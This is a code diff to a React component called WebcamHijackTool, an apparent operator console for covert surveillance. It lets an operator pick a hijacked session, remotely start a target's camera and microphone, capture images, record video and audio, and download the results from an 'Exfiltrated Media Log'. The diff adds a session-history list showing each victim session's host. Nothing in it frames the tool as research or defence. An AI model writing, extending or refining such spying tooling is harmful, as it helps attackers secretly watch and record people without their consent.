@@ -5,7 +5,7 @@ import { useState, useRef, useEffect } from 'react';
 import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
-import { Camera, Video, Mic, StopCircle, Download, Image as ImageIcon, Webcam, AudioLines, FileArchive } from 'lucide-react';
+import { Camera, Video, Mic, StopCircle, Download, Image as ImageIcon, Webcam, AudioLines, FileArchive, History } from 'lucide-react';
 import { logActivity } from '@/services/activity-log-service';
 import { useAuth } from '@/hooks/use-auth';
 import { Badge } from './ui/badge';
@@ -131,93 +131,113 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
 
   return (
     <div className="grid md:grid-cols-2 gap-8">
-      <div className="space-y-4">
-         <div className="space-y-2">
-              <Label>Target Session</Label>
-               <Select value={selectedSessionId || ''} onValueChange={setSelectedSessionId} disabled={sessions.size === 0}>
-                  <SelectTrigger>
-                      <SelectValue placeholder="Select an active session..." />
-                  </SelectTrigger>
-                  <SelectContent>
-                      {Array.from(sessions.keys()).map(id => (
-                          <SelectItem key={id} value={id}>{id}</SelectItem>
-                      ))}
-                  </SelectContent>
-              </Select>
-         </div>
-         
-          <Card className="bg-primary/10">
+      <div className="space-y-6">
+        <Card className="bg-primary/10">
+            <CardHeader>
+                <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Video Feed</CardTitle>
+                 {isCameraActive && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge>}
+            </CardHeader>
+            <CardContent className="space-y-4">
+                <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
+                    {liveFeedSrc ? (
+                        <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/>
+                    ) : (
+                        <p className="text-muted-foreground">{hasActiveSession ? 'Camera feed is inactive.' : 'Select a session.'}</p>
+                    )}
+                </div>
+                <div className="grid grid-cols-2 gap-2">
+                    <Button onClick={() => sendCommandToSession('start-video')} disabled={!hasActiveSession || isCameraActive}>Start Camera</Button>
+                    <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isCameraActive} variant="destructive">Stop Camera</Button>
+                    <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive}>Capture Image</Button>
+                    <Button onClick={() => { sendCommandToSession('start-video-record'); setIsVideoRecording(true); }} disabled={!isCameraActive || isVideoRecording}>Start Video Recording</Button>
+                    <Button onClick={() => { sendCommandToSession('stop-video-record'); setIsVideoRecording(false); }} disabled={!isCameraActive || !isVideoRecording} variant="destructive">Stop Video Recording</Button>
+                </div>
+            </CardContent>
+        </Card>
+
+         <Card className="bg-primary/10">
               <CardHeader>
-                  <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Video Feed</CardTitle>
-                   {isCameraActive && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge>}
+                  <CardTitle className="text-lg flex items-center gap-2"><Mic className="h-5 w-5"/> Audio Feed</CardTitle>
+                  {isMicActive && <Badge variant="destructive" className="w-fit"><AudioLines className="mr-2 h-4 w-4"/> LIVE</Badge>}
               </CardHeader>
               <CardContent className="space-y-4">
-                  <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
-                      {liveFeedSrc ? (
-                          <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/>
-                      ) : (
-                          <p className="text-muted-foreground">{hasActiveSession ? 'Camera feed is inactive.' : 'Select a session.'}</p>
-                      )}
-                  </div>
-                  <div className="grid grid-cols-2 gap-2">
-                      <Button onClick={() => sendCommandToSession('start-video')} disabled={!hasActiveSession || isCameraActive}>Start Camera</Button>
-                      <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isCameraActive} variant="destructive">Stop Camera</Button>
-                      <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive}>Capture Image</Button>
-                      <Button onClick={() => { sendCommandToSession('start-video-record'); setIsVideoRecording(true); }} disabled={!isCameraActive || isVideoRecording}>Start Video Recording</Button>
-                      <Button onClick={() => { sendCommandToSession('stop-video-record'); setIsVideoRecording(false); }} disabled={!isCameraActive || !isVideoRecording} variant="destructive">Stop Video Recording</Button>
+                   <div className="grid grid-cols-2 gap-2">
+                      <Button onClick={() => sendCommandToSession('start-mic')} disabled={!hasActiveSession || isMicActive}>Start Mic</Button>
+                      <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isMicActive} variant="destructive">Stop Mic</Button>
+                      <Button onClick={() => { sendCommandToSession('start-audio-record'); setIsAudioRecording(true); }} disabled={!isMicActive || isAudioRecording}>Start Audio Recording</Button>
+                      <Button onClick={() => { sendCommandToSession('stop-audio-record'); setIsAudioRecording(false); }} disabled={!isMicActive || !isAudioRecording} variant="destructive" className="col-span-2">Stop Audio Recording</Button>
                   </div>
               </CardContent>
           </Card>
-
-           <Card className="bg-primary/10">
-                <CardHeader>
-                    <CardTitle className="text-lg flex items-center gap-2"><Mic className="h-5 w-5"/> Audio Feed</CardTitle>
-                    {isMicActive && <Badge variant="destructive" className="w-fit"><AudioLines className="mr-2 h-4 w-4"/> LIVE</Badge>}
-                </CardHeader>
-                <CardContent className="space-y-4">
-                     <div className="grid grid-cols-2 gap-2">
-                        <Button onClick={() => sendCommandToSession('start-mic')} disabled={!hasActiveSession || isMicActive}>Start Mic</Button>
-                        <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isMicActive} variant="destructive">Stop Mic</Button>
-                        <Button onClick={() => { sendCommandToSession('start-audio-record'); setIsAudioRecording(true); }} disabled={!isMicActive || isAudioRecording}>Start Audio Recording</Button>
-                        <Button onClick={() => { sendCommandToSession('stop-audio-record'); setIsAudioRecording(false); }} disabled={!isMicActive || !isAudioRecording} variant="destructive" className="col-span-2">Stop Audio Recording</Button>
-                    </div>
-                </CardContent>
-            </Card>
-
       </div>
       
-      <div className="space-y-4">
-          <h3 className="font-semibold text-lg flex items-center gap-2"><FileArchive /> Exfiltrated Media Log</h3>
-          <Card className="h-full flex flex-col min-h-[400px]">
-              <CardContent className="p-2 flex-grow">
-                  <ScrollArea className="h-full max-h-[70vh]">
-                      <div className="p-4">
-                       {capturedMedia.length === 0 ? (
-                          <p className="text-center text-muted-foreground py-16">No media captured yet.</p>
-                       ) : (
-                          <div className="space-y-3">
-                              {capturedMedia.map(chunk => (
-                                  <div key={chunk.id} className="flex items-center justify-between p-2 bg-background rounded-md">
-                                      <div className="flex items-center gap-3">
-                                          {chunk.type === 'image' ? <ImageIcon className="h-5 w-5 text-accent"/> : chunk.type === 'video' ? <Video className="h-5 w-5 text-accent" /> : <Mic className="h-5 w-5 text-accent" />}
-                                          <div className="text-xs">
-                                              <p className="capitalize font-semibold">{chunk.type} Capture</p>
-                                              <p className="text-muted-foreground font-mono" title={chunk.sessionId}>{chunk.sessionId.substring(0,20)}...</p>
-                                              <p className="text-muted-foreground">{format(new Date(chunk.timestamp), 'PPpp')}</p>
-                                          </div>
-                                      </div>
-                                      <div className='flex items-center gap-2'>
-                                          <Button size="icon" variant="ghost" onClick={() => downloadMedia(chunk)}><Download className="h-4 w-4"/></Button>
-                                      </div>
-                                  </div>
-                              ))}
-                          </div>
-                       )}
-                       </div>
-                  </ScrollArea>
-              </CardContent>
-          </Card>
+      <div className="space-y-6">
+        <Card>
+            <CardHeader>
+                <CardTitle className="text-lg flex items-center gap-2"><History className="h-5 w-5"/> Session History</CardTitle>
+                <CardDescription>Select a session to interact with.</CardDescription>
+            </CardHeader>
+            <CardContent>
+                 <ScrollArea className="h-40">
+                    <div className="space-y-2 pr-2">
+                     {sessions.size === 0 ? (
+                        <div className="text-center text-muted-foreground pt-10">No active sessions.</div>
+                     ) : (
+                        Array.from(sessions.keys()).map(sessionId => (
+                            <Button 
+                            key={sessionId} 
+                            variant={selectedSessionId === sessionId ? 'secondary' : 'ghost'}
+                            className="w-full justify-start font-mono text-xs h-auto py-2"
+                            onClick={() => setSelectedSessionId(sessionId)}
+                            >
+                            <div className="flex flex-col items-start text-left">
+                                <span>{sessionId}</span>
+                                <span className="text-muted-foreground font-sans truncate">
+                                    {sessions.get(sessionId)?.[0]?.url.split('//')[1].split('/')[0]}
+                                </span>
+                            </div>
+                            </Button>
+                        ))
+                     )}
+                    </div>
+                </ScrollArea>
+            </CardContent>
+        </Card>
+        
+        <Card className="h-full flex flex-col min-h-[300px]">
+             <CardHeader>
+                <CardTitle className="text-lg flex items-center gap-2"><FileArchive /> Exfiltrated Media Log</CardTitle>
+            </CardHeader>
+            <CardContent className="p-2 flex-grow">
+                <ScrollArea className="h-64">
+                    <div className="p-2">
+                     {capturedMedia.length === 0 ? (
+                        <p className="text-center text-muted-foreground py-16">No media captured yet.</p>
+                     ) : (
+                        <div className="space-y-3">
+                            {capturedMedia.map(chunk => (
+                                <div key={chunk.id} className="flex items-center justify-between p-2 bg-background rounded-md">
+                                    <div className="flex items-center gap-3">
+                                        {chunk.type === 'image' ? <ImageIcon className="h-5 w-5 text-accent"/> : chunk.type === 'video' ? <Video className="h-5 w-5 text-accent" /> : <Mic className="h-5 w-5 text-accent" />}
+                                        <div className="text-xs">
+                                            <p className="capitalize font-semibold">{chunk.type} Capture</p>
+                                            <p className="text-muted-foreground font-mono" title={chunk.sessionId}>{chunk.sessionId.substring(0,20)}...</p>
+                                            <p className="text-muted-foreground">{format(new Date(chunk.timestamp), 'PPpp')}</p>
+                                        </div>
+                                    </div>
+                                    <div className='flex items-center gap-2'>
+                                        <Button size="icon" variant="ghost" onClick={() => downloadMedia(chunk)}><Download className="h-4 w-4"/></Button>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                     )}
+                     </div>
+                </ScrollArea>
+            </CardContent>
+        </Card>
       </div>
     </div>
   );
 }
+
